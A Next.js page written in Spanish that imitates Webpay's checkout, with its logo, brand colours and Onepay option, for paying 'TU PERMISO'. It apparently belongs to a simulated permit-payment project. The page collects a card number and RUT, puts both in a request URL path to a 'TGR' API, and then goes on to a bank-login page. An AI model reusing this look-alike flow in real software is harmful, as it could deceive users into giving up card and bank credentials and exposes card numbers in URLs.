// Página de Webpay
'use client';

import { HiOutlineCreditCard } from "react-icons/hi2";
import { IoPerson } from "react-icons/io5";
import { MdQrCodeScanner } from "react-icons/md";
import { FaRegCreditCard } from "react-icons/fa";
import { PiBankLight } from "react-icons/pi";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import API_CONFIG from "@/config/api";

// Colores webpay
const coloresWebpay = {
	morado: '#6D2077',
	rosado: '#D00070',
	cyan: '#00C7B1',
};

// Función para formatear número de tarjeta
function formatearNumeroTarjeta(valor: string) {
  const soloNumeros = valor.replace(/\D/g, '');
  return soloNumeros.replace(/(.{4})/g, '$1 ').trim();
}

// Función para formatear RUT con puntos y guión
function formatearRut(rut: string) {
  // Elimina todo lo que no sea número o K/k
  rut = rut.replace(/[^0-9kK]/g, '').toUpperCase();
  if (rut.length === 0) return '';
  let cuerpo = rut.slice(0, -1);
  let dv = rut.slice(-1);
  cuerpo = cuerpo.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
  return cuerpo.length ? `${cuerpo}-${dv}` : dv;
}

export default function WebpayPage() {
    const [medioSeleccionado, setMedioSeleccionado] = useState<"tarjeta" | "onepay" | null>(null);
    const [numeroTarjeta, setNumeroTarjeta] = useState('');
    const [rutTarjeta, setRutTarjeta] = useState('');
    const [montoPago, setMontoPago] = useState<string | null>(null); // Monto fijo de $1.000

	const [error, setError] = useState('');
    
	const [loading, setLoading] = useState(false);
    
	const router = useRouter();

	// Recuperamos monto pago desde sessionStorage
	useEffect(() => {
		const datos = sessionStorage.getItem('formato_pago');
		if (datos) {
			const parsed = JSON.parse(datos).monto_pago;
			setMontoPago(Number(parsed).toLocaleString());
		}
	}, []);

    // Función para limpiar el número de tarjeta y rut antes de enviar
    function limpiarNumeroTarjeta(valor: string) {
        return valor.replace(/\D/g, '');
    }
    function limpiarRut(valor: string) {
        return valor.replace(/[.]/g, '');
    }

    async function handleValidarBanco(e: React.FormEvent) {
        e.preventDefault();
        setError('');
        setLoading(true);
        try {
            const numTarjetaLimpio = limpiarNumeroTarjeta(numeroTarjeta);
            const rutLimpio = limpiarRut(rutTarjeta);
            const res = await fetch(`${API_CONFIG.TGR}banco/${numTarjetaLimpio}/${rutLimpio}`);
            if (!res.ok) {
                setError('No se pudo validar la tarjeta o el RUT. Verifica los datos e inténtalo nuevamente.');
                setLoading(false);
                return;
            }
            const data = await res.json();
            // Puedes validar aquí si la respuesta es la esperada
            if (data && data.banco) {
				// Guardar datos en sessionStorage
				sessionStorage.setItem('rutTarjeta', rutLimpio);
				sessionStorage.setItem('banco', data.banco);
                router.push('/webpay/login-banco');
            } else {
                setError('Datos incorrectos o banco no encontrado.');
            }
        } catch (err) {
            setError('Error de conexión. Intenta nuevamente.');
        }
        setLoading(false);
    }

    return (
        <div style={{ fontFamily: 'Arial, sans-serif'}}>
			{/* Navbar */}
			<nav>
					{/* Barra superior de colores */}
				<div style={{ display: 'flex', height: '10px' }}>
					<div style={{ backgroundColor: coloresWebpay.morado, width: '75%' }}></div>
					<div style={{ backgroundColor: coloresWebpay.rosado, width: '10%' }}></div>
					<div style={{ backgroundColor: coloresWebpay.cyan, width: '15%' }}></div>
				</div>
				{/* Logo webpay */}
				<div>
					<img src="/img/webpay-logo.png" alt="Logo Webpay" style={{ height: '10vh' }} />
				</div>
			</nav>
      {/* Contenido principal de pago */}
			<div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', minHeight: '60vh' }}>
				<div className="card-like p-4 m-4 shadow-lg row" style={{ width: '85%', maxWidth: '1200px' }}>
					<div className="col p-4 mx-4">
						{/* Información de pago */}
						<div className="row">
							<div className="col text-left">
								<p>Estás pagando en:</p>
								<p style={{ fontWeight: 'bold', fontSize: '1.5rem' }}>TU PERMISO</p>
							</div>
							<div className="col text-right">
								<p>Monto a pagar:</p>
								<p style={{ fontWeight: 'bold', fontSize: '1.5rem' }}>${montoPago}</p>
							</div>
						</div>
						{/* Seleccionar medio de pago */}
						<div className="row">
							<div className="col">
								<p style={{ fontWeight: 'bold' }}>Selecciona tu medio de pago:</p>
							</div>
						</div>
						{/* Botón tarjetas */}
						<div className="row mb-3">
							<div className="col">
								<button
									className={`card-like p-3 medio-pago-btn ${medioSeleccionado === "tarjeta" ? "activo" : ""}`}
									style={{ width: '100%' }}
									onClick={() => setMedioSeleccionado("tarjeta")}
									type="button"
								>
									<div className="row">
										<div className="col-3 justify-content-center self-center d-flex">
											<HiOutlineCreditCard style={{ fontSize: '3rem', color: 'black' }} />
										</div>
										<div className="col text-left">
											<div>
												<p style={{ fontWeight: 'bold', fontSize: '1.2rem' }}>Tarjetas</p>
												<p className="text-muted m-0">Crédito, Débito, Prepago</p>
											</div>
										</div>
									</div>
								</button>
							</div>
						</div>
						{/* Botón Onepay */}
						<div className="row">
							<div className="col">
								<button
									className={`card-like p-3 medio-pago-btn ${medioSeleccionado === "onepay" ? "activo" : ""}`}
									style={{ width: '100%' }}
									onClick={() => setMedioSeleccionado("onepay")}
									type="button"
								>
									<div className="row">
										<div className="col-3 justify-content-center self-center d-flex">
											<MdQrCodeScanner style={{ fontSize: '3rem', color: 'black' }} />
										</div>
										<div className="col text-left">
											<div>
												<img src="/img/logo-onepay/SVG_Onepay/_FondoBlanco_SVG/_300px/1.Onepay_FB_300px.svg" alt="Logo Onepay" style={{ height: '2rem' }} />
												<p className="text-muted mb-0 mt-3">y otras billeteras digitales</p>
											</div>
										</div>
									</div>
								</button>
							</div>
						</div>
						{/* Anular compra y volver */}
						<div className="row mt-4">
							<div className="col text-center m-4">
								<a href="/home/formulario-pago" style={{ textDecoration: 'none', color: '#447feeff', fontWeight: 'bold' }}>Anular compra y volver</a>
							</div>
						</div>
					</div>
					<div className="col p-4 mx-4">
						<div className="text-center">
							<p style={{ fontWeight: 'bold' }}>Ingresa los datos de tu tarjeta:</p>
						</div>
						{/* Imagen por defecto de tarjeta */}
						<div className="text-center mb-4">
							{/* Tarjeta de crédito simulada */}
							<div
								style={{
									width: '320px',
									maxWidth: '90%',
									height: '180px',
									background: '#e9ecf0ff',
									borderRadius: '18px',
									margin: '0 auto',
									position: 'relative',
									padding: '24px 28px',
									display: 'flex',
									flexDirection: 'column',
									justifyContent: 'space-between',
									alignItems: 'flex-start'
								}}
							>
								<PiBankLight style={{ fontSize: '2rem', color: '#7a869a' }} />
								<div style={{ fontSize: '1rem', letterSpacing: '2px', color: '#4b587c', margin: '16px 0 0 0' }}>
									XXXX XXXX XXXX XXXX
								</div>
								<div style={{ display: 'flex', width: '100%', justifyContent: 'space-between', alignItems: 'center' }}>
									<span style={{ color: '#7a869a', fontSize: '1rem' }}>XX/XX</span>
									<FaRegCreditCard style={{ fontSize: '1.5rem', color: '#7a869a' }} />
								</div>
							</div>
						</div>
						{/* Número de tarjeta */}
						<form onSubmit={handleValidarBanco}>
							<div className="mb-3">
								<label htmlFor="cardNumber" className="form-label" style={{ fontWeight: 'bold' }}>Número de tarjeta</label>
								<div style={{ position: 'relative' }}>
									<HiOutlineCreditCard
										style={{
											position: 'absolute',
											left: 14,
											top: '50%',
											transform: 'translateY(-50%)',
											fontSize: '1.5rem',
											color: '#585858ff',
											pointerEvents: 'none'
										}}
									/>
									<input
										type="text"
										className="form-control"
										placeholder="XXXX XXXX XXXX XXXX"
										style={{ paddingLeft: '3rem', height: '3rem', borderRadius: '7px', borderWidth: '2px', borderColor: '#d1d1d1' }}
										id="cardNumber"
										maxLength={19}
										value={numeroTarjeta}
										onChange={e => setNumeroTarjeta(formatearNumeroTarjeta(e.target.value))}
										required
									/>
								</div>
							</div>
							{/* RUT */}
							<div className="mb-3">
								<label htmlFor="rutTarjeta" className="form-label" style={{ fontWeight: 'bold' }}>RUT</label>
								<div style={{ position: 'relative' }}>
									<IoPerson
										style={{
											position: 'absolute',
											left: 14,
											top: '50%',
											transform: 'translateY(50%)',
											fontSize: '1.5rem',
											color: '#585858ff',
											pointerEvents: 'none'
										}}
									/>
								</div>
								<input
									type="text"
									className="form-control"
									placeholder="12.345.678-9"
									style={{ paddingLeft: '3rem', height: '3rem', borderRadius: '7px', borderWidth: '2px', borderColor: '#d1d1d1' }}
									id="rutTarjeta"
									maxLength={12}
									value={rutTarjeta}
									onChange={e => {
										const limpio = e.target.value.replace(/[.\-]/g, '');
										setRutTarjeta(formatearRut(limpio));
									}}
									required
								/>
							</div>
							{/* Mensaje de error */}
							{error && (
								<div
									style={{
										background: '#fff0f3',
										border: '2px solid #D00070',
										borderRadius: '12px',
										color: '#D00070',
										padding: '16px',
										marginBottom: '18px',
										fontWeight: 'bold',
										textAlign: 'center'
									}}
								>
									{error}
								</div>
							)}
							{/* Botón continuar */}
							<div className="text-center">
								<button
									className=""
									style={{
										backgroundColor: coloresWebpay.morado,
										borderColor: coloresWebpay.morado,
										borderRadius: '7px',
										width: '100%',
										color: 'white',
										fontWeight: 'bold',
										padding: '10px',
										fontSize: '1rem',
										height: '4rem',
										opacity: loading ? 0.7 : 1,
										cursor: loading ? 'not-allowed' : 'pointer'
									}}
									type="submit"
									disabled={loading}
								>
									{loading ? "Validando..." : "Continuar"}
								</button>
							</div>
						</form>
						{/* Medios de pago */}
						<div className="text-center mt-4 d-flex flex-column align-items-center">
							<img src="/img/medios-pago.png" alt="Medios de pago" style={{ width: '50%' }} />
						</div>
					</div>
				</div>
			</div>
			<style jsx>{`
                .medio-pago-btn {
                    border: 2px solid #e0e0e0;
                    border-radius: 12px;
                    background: white;
                    transition: background 0.2s, border-color 0.2s;
                    cursor: pointer;
                }
                .medio-pago-btn:hover {
                    background: #ddddddff;
                }
                .medio-pago-btn.activo {
                    border-color: #D00070 !important;
                    background: #ffffffff;
                }
            `}</style>
		</div>
  );
}